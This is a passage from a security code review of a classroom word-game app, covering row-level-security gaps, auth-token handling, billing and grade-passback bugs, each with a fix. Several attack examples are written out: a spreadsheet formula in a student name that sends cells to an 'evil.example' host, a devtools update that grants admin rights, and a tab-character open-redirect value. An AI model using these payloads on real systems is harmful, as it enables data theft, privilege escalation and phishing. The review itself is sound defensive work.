3. A student writes their own progress row from the client. Without column-level restrictions they can set `total_xp`, `completed_at` and `words_mastered`.
4. Those columns feed the teacher reports and leaderboards that Pro sells.

**Fix:**
- Remove INSERT on `classrooms` for the `authenticated` role, so only the service role can create classes, via the API.
- Move progress writes to an RPC or route, or `REVOKE UPDATE` on XP and completion columns.
- Delete the browser `createClassroom` export so nobody wires it back up.

---

## 4. Classroom sockets handshake with a token that expires after about an hour (confirmed client-side, Medium–High)

**Where:** `fe-next/hooks/useActiveClassroomGame.ts:124-127`, `:103`, `:107-110`

**Failure scenario:**
1. `auth: { token }` is a static object captured at mount. The late-upgrade path sets `sock.auth = { token: late }` once, then deliberately stops listening for refreshes.
2. Supabase access tokens expire in about an hour.
3. Socket.io reuses the same `auth` object on every reconnect.
4. A student hub tab open longer than an hour reconnects with an expired JWT after any Wi-Fi blip, laptop sleep or deploy. A deploy during the school day reconnects every socket at once.
5. The server rejects the token or treats the socket as anonymous. The comment at line 85 says `joinClassroomGame` then refuses with "Authentication required".
6. JOIN fails for the whole class until each student reloads.

**Fix:** Use the callback form, which socket.io re-evaluates on every connection attempt:
```ts
auth: async (cb) => {
  const { data } = await supabase.auth.getSession();
  cb({ token: data.session?.access_token });
}
```
Check the teacher launch socket and the main `SocketProvider` for the same static-token pattern. A teacher's controls going anonymous mid-lesson is worse than a student's.

---

## 5. `fetchUserData` side effects run concurrently and survive the sign-in reload (confirmed, Medium)

**Where:**
- `useProfileManagement.ts:314-317`
- `useAuthInitialization.ts:124` and `:145`/`:399`
- `useAuthState.ts:34-36`
- `useAuthInitialization.ts:359`
- `useMultiplayerAuth.ts:84-89`

**Failure scenario:**
1. `initAuth` calls `setUser` and fires `fetchUserData` without awaiting it. It then subscribes to `onAuthStateChange`, which immediately emits `INITIAL_SESSION`.
2. `userIdRef` is only updated in a `useEffect` after the next commit. It is often still `null`, so `isNewUser` is true and a second `fetchUserData` starts.
3. `refreshProfile` on every multiplayer page mount, cross-tab `AUTH_SUCCESS` and tab visibility add more calls.
4. Each call fires `submitPendingDailyResult` and `syncGuestResults` without awaiting them. Both read the pending result before either clears it in `finally`, so you get two POSTs, two toasts, two `router.push` calls and a double guest sync.
5. On guest-to-account signup, line 359 runs `window.location.reload()` once `fetchUserData` resolves, but the un-awaited submit is still in flight. The request can reach the server while `finally` never runs. The result survives the reload and is submitted again.

**Fix:**
- Put a module-level single-flight promise around `submitPendingDailyResult` and `syncGuestResults`.
- Claim the pending item by moving it to a "submitting" key before the fetch.
- Set `userIdRef.current` synchronously next to every `setUser`.
- Await the pending work before the reload.
- Rely on the server unique key from finding 2 as the backstop.

---

## 6. The profile guard can show one account's profile under another account (confirmed, Medium)

**Where:**
- `useProfileManagement.ts:298-303`
- `useCrossTabSync.ts:61-67`
- `useAuthInitialization.ts:311-313`

**Failure scenario:**
1. A teacher (account A, `has_customized_profile: true`) is signed in. On a shared school Chromebook, a student then signs in as B in another tab, or without signing out first.
2. Cross-tab `AUTH_SUCCESS`, or `SIGNED_IN` with a new id, calls `setUser(B)` and then `fetchUserData(B)` without clearing `profile`.
3. B's row exists with `has_customized_profile: false`. The guard keeps `current`, which is still A's profile.
4. Now `user = B` and `profile = A`. `isTeacher` and `isAdmin` are computed from A's profile, and A's name and avatar appear.
5. Separately, a slow `fetchUserData(A)` that resolves after a switch overwrites the new profile, because nothing checks the id.

The server still checks authorisation, but B sees A's data and teacher chrome.

**Fix:**
- Apply the guard only when `current?.id === profileData.id`.
- Discard the result when `userIdRef.current !== userId`.
- Call `setProfile(null)` whenever `setUser` switches to a different id.

---

## 7. The per-IP rate limit on live-game lookup breaks at school scale (confirmed client-side, Medium, 10x)

**Where:** `fe-next/hooks/useLiveClassroomGameInfo.ts:12-16`, `:71-77`

**Failure scenario:**
1. The lookup route allows 60 requests per minute per IP. The comment says so, and also says a class behind one school NAT can trip it.
2. The retries are at 1s and 3s, which is 4 seconds inside a 60-second window. They will also get a 429, and each one uses up more of the bucket.
3. Three classes starting together on one school egress IP, about 90 students at up to 3 attempts each, puts most students in `status: 'error'`.
4. Classroom detection then falls back to its old behaviour. The lobby shows Classic defaults and a generic heading, and exits route to the arcade instead of education.

This is exactly the "whole school adopts it" moment you want to sell into.

**Fix:**
- Key the limit on `(userId, code)` for authenticated callers, including anonymous guests, who all have a session by this point. Keep the tight per-IP limit only for callers with no session.
- Honour `Retry-After` with jittered backoff up to about 60s.
- The record is immutable per room (lines 33-35), so serve it with a cache header or push it over the socket the student already holds.

---

## 8. Async challenges can submit the wrong game and retry without a stopping rule (confirmed, Medium)

**Where:** `fe-next/hooks/useAsyncChallengeProducer.ts:95-106`, `:117-205`

**Failure scenario:**
1. `pendingFriendChallenge` has no TTL and nothing binds it to the challenge board. The challenger config is bound only by a one-hour TTL.
2. A friend taps Accept, abandons, and plays any other game in the same session. When that game ends, its score is PUT as the challenge result. The server marks the challenge completed and pushes "you lost" or "you won" to both players.
3. On failure, `firedRef.current = false` (lines 159 and 201). The effect depends on the `words` and `letterGrid` array identities, so every re-render after a failure re-POSTs and shows another error toast.
4. A permanent 4xx, such as an already-completed challenge or a validation error, repeats this indefinitely.
5. If the POST succeeded but the response was lost, the retry creates a second challenge row and sends a second push.

**Fix:**
- Store the board or seed in both configs and require `letterGrid` to match before submitting. Add a TTL to the challenged config.
- Send an idempotency key.
- Never auto-retry a 4xx. Retry only on an explicit user tap.

---

## 9. Each student opens extra sockets and polls every 15 seconds (confirmed client-side, Medium, 10x)

**Where:** `useActiveClassroomGame.ts:124` and `:260-262`. The comment at `:271-274` names two consumers, `ClassroomGameBanner` and `PlayWithClassButton`.

**Failure scenario:**
1. Every mount opens its own socket.io connection, separate from the app's main socket. A student hub can therefore hold three sockets.
2. Each socket polls `getActiveClassroomGames` every 15 seconds, even though push events (`classroomGameCreated` and `classroomGameEnded`) already cover the changes.
3. Each poll reads the Redis set and every game record. Per Shard 5, the server returns full records including vocabulary and players.
4. At 5,000 concurrent students, that is about 10,000 extra sockets and roughly 670 Redis-heavy emits per second, on what appears to be a single Node process.

**Fix:**
- Use one shared socket (`SocketProvider`) and one store for the active game.
- Poll only on reconnect or visibility change, or at 60s or more as a safety net.
- Return a slim projection from the server.

---

## 10. A session error on load signs the user out on every device (confirmed, Low–Medium)

**Where:** `useAuthInitialization.ts:266-268`

**Failure scenario:**
1. Any session error on load that isn't network-related, refresh-related or recoverable calls `supabase.auth.signOut()`.
2. In supabase-js v2 the default scope is `'global'`, which revokes every refresh token the user holds.
3. A one-off error on a teacher's phone therefore logs out the projector laptop in the middle of a lesson.
4. `useClearAuthState` already uses `{ scope: 'local' }`. This path is the inconsistent one.

**Fix:** Use `signOut({ scope: 'local' })`, or route this path through `clearAuthState`.

---

**What to fix first:**
- **#1:** a two-line fix that recovers your best conversion path.
- **#2 and #3:** check the daily-submit route and the `classrooms` and progress RLS policies. If either is open, the leaderboard or the Pro cap can be bypassed today.
- **#4:** fix this before the next deploy during school hours.

## Shard 23

# Deep review: what the previous pass missed

**Scope.** This covers the auth, trust-boundary and education-lib files shown in this batch. I excluded everything the earlier shards already reported, including the Blast plain `fetch`, the guest-progress wipe, One Tap suppression, the overdue-day bug, the Hebrew `\b`, the training updater side effects and the stale-response hooks. I could not see RLS migrations or the Blast server routes. Findings that depend on them are marked **verify**.

Ordered by severity.

---

## 1. Every admin and beta gate trusts a flag on a table the client writes to (verify RLS). Critical if true.

**Where:**
- `fe-next/lib/auth/adminAuth.ts:81-87` and `:139-145`
- `isAdminSession.ts:18-24`
- `canSeeInWorkModesSession.ts:19-26`
- `curatorAuth.ts:107-117`
- `inWorkModeAccess.ts:18-20`

**What the code does:** Admin, curator-admin bypass and beta access all reduce to `profiles.is_admin` or `profiles.is_beta_tester`. The browser writes to that same `profiles` row directly. Earlier shards show `createProfile` in `useProfileManagement`, `saveProfile`/`updateProfile` in `ProfileHeader`, and the parental-controls override.

**Failure scenario:**
1. A signed-in user opens devtools and runs `supabase.from('profiles').update({ is_admin: true }).eq('id', myId)`.
2. If the `profiles` UPDATE policy is the usual `auth.uid() = id` with no column restriction, the update succeeds.
3. `verifyAdminAuth` now passes on the cookie path, because it reads the profile through the user's own client.
4. The user now has every admin API: the Teacher Pro grant panel (free Pro), curator ratify (coins), word approvals, the CSV export of the teacher access queue, and web vitals.
5. The same thing works on INSERT. A first-time `createProfile` could include `is_admin: true`.

**Fix:**
- `REVOKE UPDATE (is_admin, is_beta_tester) ON profiles FROM authenticated, anon`, and the same for INSERT. Alternatively, use a `BEFORE INSERT OR UPDATE` trigger that rejects changes to those columns unless `auth.role() = 'service_role'`.
- The cleaner fix is to move roles into a separate `user_roles` table that only the service role can write.
- Check the other server-trusted columns on `profiles` the same way: `premium_avatar_parts`, `curator_points`, `total_score`, `ranked_mmr` and the teacher role.

---

## 2. `getAuthedUser` ignores the Bearer token on reads and swaps identity on writes. Medium-high.

**Where:** `fe-next/lib/auth/getAuthedUser.ts:58-73`

**What the code does:**
- On a GET, the Bearer token is only used if local HS256 verification succeeds.
- Otherwise the code drops to `supabase.auth.getUser()` with no argument, which reads the cookie session.
- `getBearerUser.ts` explicitly falls back to a remote check of the token. This helper doesn't.

**Failure scenario:**
1. Any of these makes local verification fail:
   - `SUPABASE_JWT_SECRET` is unset. `getBearerUser.ts:26-43` says this has happened before.
   - The project uses the newer asymmetric JWT signing keys, so HS256 never verifies.
   - The token was signed with a rotated secret.
2. A client sends `GET` with `Authorization: Bearer <valid A>`. This is `fetchWithAuth`, the native app, or the "cookie session can be stale" case.
3. Line 72 returns the cookie user. That is `null`, so the request gets a 401, which matches the stale-cookie 401s seen elsewhere. Or it is a different user B, so B's data is served to a client that asked as A.
4. On writes, an expired or invalid Bearer at line 69 also falls through to the cookie user at line 72. The write is then performed as B, not rejected.

**Fix:**
- If a Bearer token is present, it should be authoritative. Verify it locally, then remotely with `getUser(bearer)`. Return `null` if both fail.
- Never fall back to the cookie when a Bearer token was sent. This mirrors `adminAuth.ts:39-40`, which already does it correctly.

---

## 3. The auth helpers strip `is_anonymous`, so no route can reliably tell a guest from a real account. Medium.

**Where:**
- `fe-next/lib/auth/verifyJwt.ts:21-45`
- `getAuthedUser.ts:76-78`
- `getBearerUser.ts:70-74`

**What the code does:** Supabase anonymous sign-ins issue tokens with `aud: 'authenticated'` and `role: 'authenticated'`, plus an `is_anonymous: true` claim. `LocalUser` keeps only `id`, `email` and `role`, so the flag is gone before any route sees the user.

**Failure scenario:**
1. `/api/education/classroom/join` mints an anonymous user on demand (shard 4 #7).
2. That guest's token passes every `getAuthedUser` or `getBearerUser` gate as a full user.
3. Shard 4 found one symptom: the miss-gap roster leak. Its fix, `!user.is_anonymous`, can't be written, because the field doesn't exist on `LocalUser`.
4. Any route that assumes "authed = signed-up" is equally open. Examples are referral credit, curator proposals, teacher-access requests and checkout initiation.

**Fix:**
- Add `isAnonymous: payload.is_anonymous === true` in `verifyJwtLocal`, and `user.is_anonymous` in the remote paths.
- Add an `opts.requireRealUser` that returns `null` for guests.
- Audit the call sites that should require a real account.

---

## 4. The client tells the server how many coins and gems a level earned (verify the server). High if trusted.

**Where:** `fe-next/lib/blast/v2/useBlastProgress.ts:136-145`, and the queue replay through `enqueueClear` at `:132`

**What the code does:** `clear-level` POSTs `earnedCoins` and `earnedGems` next to the anti-cheat `submission`. The response returns the new `coins` balance, which suggests the server may simply add what it receives.

**Failure scenario:**
1. A player intercepts the request, or edits the queued entry in localStorage before `flushClearQueue` replays it.
2. They set `earnedCoins: 1e9`.
3. If `/api/blast/clear-level` credits the client value, the coin economy is minted. The same applies to chest progress.
4. Shard 3 called the Blast level trust "only cheating". Coins feed avatar parts and chests, so this is an economy problem, not just a leaderboard one.

**Fix:**
- The server must derive coins and gems from the validated `ClearSubmission` (level, moves, score), with a hard per-level cap.
- Drop `earnedCoins` and `earnedGems` from the payload entirely.

---

## 5. Garbage Bearer tokens each trigger a remote Supabase Auth call, which is a cheap DoS. Medium. This breaks at 10x.

**Where:** `fe-next/lib/auth/getBearerUser.ts:52-68`

**What the code does:**
- Any token that fails local verification goes to `supabase.auth.getUser(token)`.
- There is no negative cache and no per-IP limit.
- The file's own header says these remote calls hung Railway's proxy and caused the 502 incident.

**Failure scenario:**
1. A bot, or one buggy client loop, sends `Authorization: Bearer x` to any Bearer GET route.
2. Each request costs a GoTrue round trip and holds a Node socket.
3. At volume this does two things:
   - It reproduces the 502s.
   - It burns Supabase Auth rate limits that legitimate logins share.
4. Separately, if the project moves to asymmetric signing keys, every legitimate call takes this slow path too.

**Fix:**
- Decode the JWT header first. If `alg` is HS256 and the secret is configured, a failed signature or expiry check should return `null` immediately with no remote call.
- Fall back to remote only when the secret is absent.
- Add asymmetric verification with `jose.createRemoteJWKSet(<supabase>/auth/v1/.well-known/jwks.json)`.

---

## 6. One failed assignment count permanently hides the Teacher Pro usage upsell. Medium, revenue.

**Where:** `fe-next/hooks/useTeacherUsagePrompt.ts:68-77` and `:93`

**What the code does:** `void Promise.all(...).then(...)` has no `.catch`.

**Failure scenario:**
1. A teacher has 3 classrooms, all under 10 students, so `rosterHit` is false.
2. One `countClassroomCreatedAssignments` call rejects, because of a network blip or an RLS error.
3. `createdLoading` stays `true` forever and an unhandled rejection is logged.
4. `loading` (line 93) stays true, so the "you've hit the limit, upgrade" prompt never renders for that session.
5. Every revisit can repeat the failure. This is the one in-product conversion ask.

**Also:** `classrooms` (the array) and `classroomKey` are both in the effect deps (line 81). If `useClassrooms` returns a new array identity on each render, the effect refires one count query per classroom per render.

**Fix:**
- Add `.catch(() => { if (!cancelled) setCreatedLoading(false); })`, keeping the fail-closed `undefined` counts.
- Depend on `classroomKey` only, and read `classrooms` through a ref.

---

## 7. Student-chosen names reach the teacher's spreadsheet unescaped, and `csvEscape` misses two trigger characters. Low-medium.

**Where:**
- `fe-next/lib/education/classroomRosterProgress.ts:96-101` (`buildParentShareSummary`)
- `classProgressGrid.ts:260-271` (`formatWeeklySummary`)
- `assignmentProgressReport.ts:149`

**What the code does:**
- The parent handout and the weekly paste are tab- and newline-joined and go to the clipboard.
- Teachers paste them into Google Sheets or Excel, which evaluate cells that start with `=`.
- `name` is the student's own display name. Guests type it at join time.

**Failure scenario:**
1. A student joins as `=IMAGE("https://evil.example/?"&A2)`, or uses `=HYPERLINK(...)`.
2. The teacher clicks "copy parent summary" and pastes it into Sheets.
3. The formula runs. It can exfiltrate neighbouring cells, which hold other students' names and scores, or plant a phishing link.
4. A tab or newline inside a name also shifts every column after it.

**Also:** `csvEscape` neutralises `= + - @` but not a leading `\t` or `\r`, which OWASP lists and Excel also treats as formula starts. It is "shared by every CSV export", so the gap spreads to all of them.

**Fix:**
- Run every cell of both clipboard builders through a `tsvCell()` that strips `\t\r\n` and applies the same leading-character guard.
- Extend `csvEscape`'s regex to `/^[=+\-@\t\r]/`.

---

## 8. Hebrew, Japanese and Russian CSV reports open as mojibake in Excel. Low-medium, paid feature.

**Where:** `fe-next/lib/education/assignmentProgressReport.ts:189-199`

**What the code does:**
- The file comment promises "a Hebrew export is Hebrew end to end".
- The Blob is UTF-8 with no BOM.
- Line 199 revokes the object URL synchronously after `click()`.

**Failure scenario:**
1. An Israeli Pro teacher downloads the report and double-clicks it.
2. Excel on Windows assumes the ANSI code page without a BOM, so every name and title becomes `×'×...`.
3. On Safari or iOS, the immediate revoke can also cancel the download. Shard 19 found the same pattern in the PDF path, not this one.

**Fix:**
- Use `new Blob(['\uFEFF' + csv], …)`.
- Revoke with `setTimeout(() => URL.revokeObjectURL(url), 10_000)`.

---

## 9. Daily word suggestions: place and mark aren't atomic, so one throw aborts every language and the same word is re-placed. Low-medium.

**Where:** `fe-next/lib/dailyChallenge/processSuggestions.ts:112-114` and `:74`

**What the code does:**
- `placeWord` writes the puzzle slot, then `markSuggestion` flips the status.
- Neither call is in a try block.
- Duplicate detection (`placedWords`) is per run only.

**Failure scenario:**
1. `placeWord(es, 2026-11-02, 'GATOS')` succeeds, then `markSuggestion` throws on a DB blip.
2. The exception escapes the loop. The remaining languages are skipped this run, and the summary never returns, so the cron reports failure with partial writes.
3. The suggestion is still `pending`. Tomorrow it passes the judge again and `isRecentlyUsed`, which only checks past usage, and is placed on another future date. The same daily word now runs twice.
4. The same thing happens without any error when two players suggest the same word on different days.

**Fix:**
- Mark the suggestion approved with `usedDate` before or with the placement, ideally in one RPC.
- Wrap each suggestion in a try block that pushes to `failures` and continues.
- Make the duplicate check include already-scheduled future dates.

---

## 10. The guest-identity HMAC reuses other secrets, including the service-role key. Low.

**Where:** `fe-next/lib/auth/guestCookie.ts:24-31`

**What the code does:** If `GUEST_COOKIE_SECRET` is unset, signing falls back to `BOOST_TOKEN_SECRET`, then to `SUPABASE_SERVICE_ROLE_KEY`.

**Failure scenarios:**
1. Rotating the service-role key, which you would do after any leak, silently invalidates every guest cookie. Vote and submission dedupe then resets for all guests at once, which is exactly the window an abuser wants.
2. If boost tokens are HMAC-SHA256 under the same secret over a payload an attacker can influence to look like `g1.<x>`, a boost token becomes a valid guest token (cross-protocol forgery). I couldn't see the boost format, so this is unverified.
3. A third-party credential is being used as an app signing key.

**Fix:**
- Require a dedicated `GUEST_COOKIE_SECRET` in production and fail closed if it is missing.
- Add a domain-separation prefix inside the HMAC input, for example `sign('lc-guest|' + payload)`.

---

**Fix first:** #1 and #4. They are the only items where one user can mint money or admin rights. Each is a 10-minute check against the RLS migration and the `clear-level` route. #2 and #5 together explain the recurring stale-session 401s and 502s, and they should be fixed in one change across the three auth helpers.

## Shard 24

# Senior review: `fe-next/lib/education/*` batch (findings the previous pass missed)

**Scope.** I left out everything the previous pass already reported:

- `googleClassroomPush.ts:71` (`.or()` injection and `maybeSingle`).
- `:129` (the `associatedWithDeveloper` check).
- The orphaned grant on apply failure in `proGrantServer.ts:155-182`.
- The streak-counter accuracy bug as a *dashboard* issue.

I did not see the route handlers (OAuth start/callback, the Polar webhook, `findUserIdByEmail`), so each finding says which call-site assumption it depends on. Findings are ordered by severity.

---

## 1. Comp grants and paid subscriptions share one row, so Polar webhooks and grant revokes undo each other
**`proGrantServer.ts:220-243`, `:337-345`, `:154-182`; `proGrant.ts:74-79`** · **High (money and data integrity)**

`applyGrantToUser` upserts the user's single `subscriptions` row with `source:'admin_grant'`. It clears the Lemon Squeezy ids but leaves the Polar columns alone. `isPaidProviderSubscription` only blocks `active` and `trialing`, so a `past_due` or `canceled` Polar row can be overwritten.

**Scenario A: the gift vanishes**
1. A teacher's card fails and their row goes to `past_due`.
2. You grant them a comp year. The grant is allowed, and the row becomes `admin_grant` and Pro.
3. Polar's dunning ends and it sends `subscription.revoked`. The previous pass found that the webhook writes `tier:'free'` keyed only by `userId`.
4. The comp year is wiped. `teacher_pro_grants` still shows it as active, so the admin UI says "active" while the teacher has no Pro.

**Scenario B: a paying customer is downgraded**
1. The payment in step 3 recovers instead. If the webhook upsert does not explicitly set `source:'polar', grant_id:null`, the row keeps `grant_id = G`.
2. Later you revoke grant G.
3. `revokeProGrant` matches `.eq('grant_id', grantId)` and sets a paying customer to `tier:'free'`. The comment at `:338` assumes the webhook clears `grant_id`, and nothing here enforces that.

**Scenario C: duplicate grants desync revoke**
1. A double-click or re-grant creates grants A and B. Nothing is idempotent at `:154`.
2. The row now carries `grant_id = B`.
3. Revoking A marks A revoked but leaves the teacher on Pro.
4. Revoking B downgrades the teacher even though A is still "active" in the table.

**Fix:**
- Stop storing grants in the provider row. Compute entitlement as `providerPro(subscriptions) OR exists(active, unrevoked grant in teacher_pro_grants)`.
- Short-term, the webhook must never overwrite an `admin_grant` row unless the event's subscription id matches the stored one, and it must always write `source:'polar', grant_id:null`.
- Add a unique partial index on `teacher_pro_grants(email) WHERE revoked_at IS NULL AND applied_at IS NOT NULL`.

## 2. An email address is treated as proof of identity in two places, without checking it was verified
**`googleClassroomPush.ts:113-117`; `proGrantServer.ts:267-299`** · **High if email confirmation is off or any OAuth provider can supply an unverified email; otherwise Low**

**Grade push:** `u.email` is used for matching whenever the account is not anonymous. `email_confirmed_at` is never checked.
1. Mallory signs up to LexiClash as `alice@school.edu` and joins Alice's class.
2. The teacher pushes grades.
3. Mallory's progress is written to Alice's submission in the official Google gradebook.

**Pending grant claim:** the pending-grant claim on sign-in picks up any unapplied grant for that email.
1. You grant Pro to `newteacher@district.org` before they have an account.
2. Someone registers that address first.
3. On sign-in they receive a year of Pro *and* `user_role: 'teacher'` (`:246-251`). That skips the teacher-access approval gate entirely.

**Fix:** In both places, require `user.email_confirmed_at`, or the provider identity's `email_verified`, before using the email.

## 3. Grade passback writes understated grades into the official Google gradebook
**`googleClassroomGrades.ts:74-91`**, together with **`lib/supabase/education/progress.ts:127`** · **High while `GC_GRADE_PASSBACK_ENABLED=true`**

The previous pass treated the streak counter as a dashboard bug. The worse impact is here.
1. `gradePercentFromProgress` computes `Σcorrect / Σattempts`.
2. `correct` is the 3-in-a-row mastery streak. It resets to 0 on any wrong answer.
3. A student who goes right, right, right, wrong on every word gets 0%.
4. That value is scaled to `maxPoints` and written as `assignedGrade`. With `returnGrades`, it is also returned to the student.
5. The `words_attempted` branch takes precedence over `completed_at → 100`, so a student who finished the lesson can still be graded near zero.

A Pro teacher is the person who notices this, in their gradebook.

**Fix:**
- Add a lifetime `total_correct` per word and grade from that.
- Until that exists, grade from completion or mastery (`words_mastered.length / lesson words`), not the streak field.
- Keep the feature flag off until this is fixed.

## 4. An open redirect after Google OAuth via a tab or newline in `returnTo`
**`googleClassroomOAuth.ts:65-69`** · **Medium (phishing that routes through accounts.google.com)**

`safeReturnTo` rejects `//` and `\`, but allows control characters. The WHATWG URL parser strips ASCII tab and newline anywhere in its input, so `new URL('/\t/evil.com', origin)` resolves to `https://evil.com/`.

1. An attacker sends a Pro teacher a link to `/api/education/google-classroom/start?returnTo=/%09/evil.com`.
2. The query value is decoded to `/\t/evil.com`, which passes the check and is sealed into the state cookie.
3. The teacher sees a genuine Google consent screen.
4. The callback redirects to `evil.com`, which shows a "reconnect, enter your password" page.

This applies if the callback resolves the path with `new URL(returnTo, req.url)`. The previous pass checked `safeReturnTo` and called it fine.

**Fix:** Reject `/[\u0000-\u001f\u007f]/`. Better, parse the value with `new URL(raw, origin)`, require `u.origin === origin`, and return `u.pathname + u.search`.

## 5. A "Start free trial" click can land on a paid checkout without warning
**`postTeacherProCheckout.ts:13-45`, `pro/upgradeViewer.ts:28-31`, `pro/resumeDecision.ts:17`** · **Medium (billing trust and chargebacks)**

Your own comment says "the checkout route quietly charges for an ineligible trial". Only the resume path guards against this.
1. `showTrialOffer` shows the trial CTA while `viewer === 'loading'`.
2. A signed-in teacher who has already used a trial taps it before entitlement resolves, or taps a stale HQ banner.
3. `postTeacherProCheckout({trial:true})` gets back a paid checkout URL.
4. `goToPolarCheckout` redirects with no check that the URL is actually a trial. The teacher expected "free for 14 days" and sees "$9 due today", or pays without reading.

**Fix:**
- Have the server return `409 trial_ineligible` when `trial:true` but the user is ineligible. Never silently downgrade a trial request.
- The client should then show "Your trial was used. Continue at $9/month?"
- Alternatively, return `{url, trial}` and confirm before redirecting when they disagree.

## 6. Provider entitlement fails open forever if a webhook is lost
**`proGrant.ts:106-110`** · **Medium (silent revenue leak)**

Provider rows are Pro whenever `status` is `active` or `trialing`, with no date bound. The comment explains why: a late renewal webhook would otherwise lock out paying users.
1. A `subscription.revoked` or trial-ended event is lost. Causes include a deploy-time 5xx, a rotated webhook secret, a handler throw, or Polar exhausting its retries.
2. The row stays `trialing` or `active` indefinitely.
3. Every gate keeps granting Pro: `gateProTeacher`, class caps and ProGate.

The churn-watch cron detects transitions but never repairs the DB.

**Fix:**
- Treat a provider row as Pro until `current_period_end + grace` (for example 3 days for `active`, 1 day for `trialing`). This still covers late renewals.
- Add a daily reconcile that re-fetches the Polar state for every row past `period_end`.

## 7. Grade push won't survive bigger classes, and some failures are reported as other things
**`googleClassroomPush.ts:111-119`, `:154-211`** · **Medium (breaks at the next 10x)**

**Per-student auth lookups:**
- `getUserById` runs once per student, all in parallel through `Promise.all`, against the GoTrue admin API.
- When a lookup errors, it is only logged at warn level and the email becomes `null`.
- The teacher is then told the student has `no_email`. That is a failure presented as a fact.

**Serial Google calls with no early stop:**
- The loop makes up to 2N sequential Google calls (patch, then `:return`).
- Only `rate_limited` stops it. With `access_type=online`, the token lasts about an hour. If it expires mid-run, or a 403 `forbidden` arrives, every remaining student still gets its own failed call and its own row marked `reauth`.

**No partial-result record:**
- If the request hits the serverless wall-clock limit, the grades that already landed are never returned to the teacher.
- Nothing persists a record of which students succeeded.

**Fix:**
- Resolve emails in one query: an RPC over `auth.users ... WHERE id = ANY($1)`, or mirror verified emails onto `profiles`.
- Surface lookup errors as their own reason, separate from `no_email`.
- Stop the loop on `reauth` and `forbidden`, as you already do for `rate_limited`.
- Patch with bounded concurrency of about 4–5.
- Persist per-student job state so a retry resumes rather than starting over.

## 8. Funnel telemetry double-counts the steps you'll use to judge first revenue
**`proFunnelTelemetry.ts:82-86`, `:201-209`, `:190-199`, `:234-241`** · **Low–Medium (decision data)**

**`checkout_open` fires more than once per click:**
- It is emitted by `trackEduProUpgradeClicked`, by `trackTeacherProCheckoutStarted` (for non-trial checkouts), and by `trackTeacherProUpgradeClick`.
- The comment at `:99-100` says the hook fires `edu_pro_upgrade_clicked` and the started event on one tap.
- So one paid click likely counts as 2–3 `checkout_open` events. This is inferred, because I can't see `useTeacherProCheckout`.

**Client and server share the `trial_expired` name:**
- `trackTrialExpiredShown` emits `trial_expired` on every HQ banner impression.
- The webhook emits the same name for a real lapse.
- Any query that doesn't filter on `surface` counts dashboard visits as churn.

**Fix:**
- Emit each canonical funnel event from exactly one place, preferably server-side.
- Rename the client banner event to something like `trial_expired_banner_viewed`.

## 9. One bad Redis entry hides the live game for the whole class
**`liveGameForClassroom.ts:42-57`** · **Low**

`JSON.parse(raw)` runs inside a single `try` around the loop.
1. One stale or foreign-shaped value under `classroom_game:<code>` makes the parse throw.
2. The `catch` returns `null` for the whole classroom.
3. Students who enter the roster code are enrolled and sent to `/student` with a success toast while the class plays on. That is the exact bug this file was written to close.

**Fix:** Put a `try/catch` around each entry and `continue` past bad ones.

---

**Checked and not flagged:**
- The CORS `*` headers on the add-on builders (they make no credentialed calls).
- The CSV escaping in `parentLinks.ts`.
- `sanitizeRequesterName`.
- Cookie sealing with uid binding.
- The pure scoring logic in `produceAnswer.ts` and `produceQuestions.ts`.
- The funnel and activity builders.

## Shard 25

# Deep review: what the previous pass missed

**Scope.** This covers the files in this batch. These findings were already reported, so I left them out:

- Accuracy computed from the streak counter, and the spaced-repetition key mismatch.
- Read-modify-write races in `challengeProgress` and `progress`.
- The unescaped `role`/`locale` in the admin-notify email.
- The `useTeacherAccess` redirect flash.
- Splitting rounds by `created_at` in `mpRoundAggregation`.
- Churn-watch pagination and lost snapshots.

What follows is new. Findings are ordered by severity. Items marked **verify** depend on RLS, routes or the native client, which I couldn't see.

---

## 1. Play Billing verification never acknowledges the purchase, so Google refunds every sale after 3 days
**`fe-next/lib/purchases/playBillingVerify.ts:37-44, 87-98`** · **High** (the route is dark today, so fix this before you enable it)

**Failure scenario:**
1. A user buys Remove Ads. The client posts the `purchaseToken`.
2. `verifyPlayPurchase` calls `products.get`. `parsePlayPurchase` returns `valid` because `purchaseState === 0`, and the route grants `ads_removed`.
3. Nothing in this module calls `…/tokens/{token}:acknowledge`, and `acknowledgementState` is never checked.
4. Play's rule is that a purchase not acknowledged within 3 days is automatically refunded and revoked.
5. The user keeps `ads_removed` forever, because nothing revokes it when the purchase is voided. You collect $0.

**Other gaps in the same function:**
- **No account binding.** It doesn't check `obfuscatedExternalAccountId` against the caller. One bought token can be posted by any number of accounts. Unless `orderId` is unique across users, each of them gets the entitlement.
- **Test purchases count as real.** `purchaseType` (0 = test) is ignored, so license-tester or sandbox purchases unlock production entitlements.

**Fix:**
- After granting, POST `purchases.products.acknowledge`. Only treat the grant as final once that succeeds, or once `acknowledgementState === 1`.
- Store `order_id` with a unique constraint, bound to the first `user_id`.
- Reject a mismatched `obfuscatedExternalAccountId`.
- Reject `purchaseType === 0` in production.
- Poll the Voided Purchases API, or use RTDN, to clear `ads_removed` on refunds.

**Verify:** if the planned Capacitor plugin acknowledges on the device, the refund problem goes away. The token-sharing and test-purchase problems remain either way.

---

## 2. Student progress is written straight from the browser, which either lets students set their own XP or silently does nothing
**`fe-next/lib/supabase/education/progress.ts:141-149, 169-179, 287-292`** · **High / Medium** (verify RLS)

**Failure scenario:**
1. `updateProgress` and `updateWordSpacedRepetition` use the browser `supabase` client to `update` or `insert` rows in `student_lesson_progress` directly.
2. For that to work, RLS must allow a student to UPDATE their own row. PostgREST then accepts *any* column on that row, not only the ones this code sends.
3. A student opens devtools and sends `PATCH student_lesson_progress?id=eq.X` with `{total_xp: 999999, words_mastered: [...all], completed_at: now}`.
4. Classroom leaderboards, mastery and the Pro analytics/reports the teacher pays for now show forged numbers. Elsewhere the repo asserts "the server is the only writer of XP and `completed_at`" (`PracticeSessionProvider`), and this path contradicts that.
5. If RLS does *not* allow the update, every call fails or matches 0 rows. Word-level progress then never saves.

**Second, separate failure in the same function: a duplicate first insert wedges the lesson for good.**
1. Two attempts arrive concurrently for a lesson with no progress row, for example a double tap or two tabs.
2. Both get `existing = null` and both INSERT (lines 169-179).
3. If there is no unique constraint on `(student_id, lesson_id)`, there are now two rows.
4. From then on, every `.maybeSingle()` (lines 105 and 258) fails with "multiple rows". That student's progress for the lesson can never be updated again.

**Fix:**
- Move these writes into a `security definer` RPC or a server route.
- REVOKE UPDATE and INSERT on `student_lesson_progress` from `authenticated`, or use column-level grants that exclude `total_xp`, `current_level` and `completed_at`.
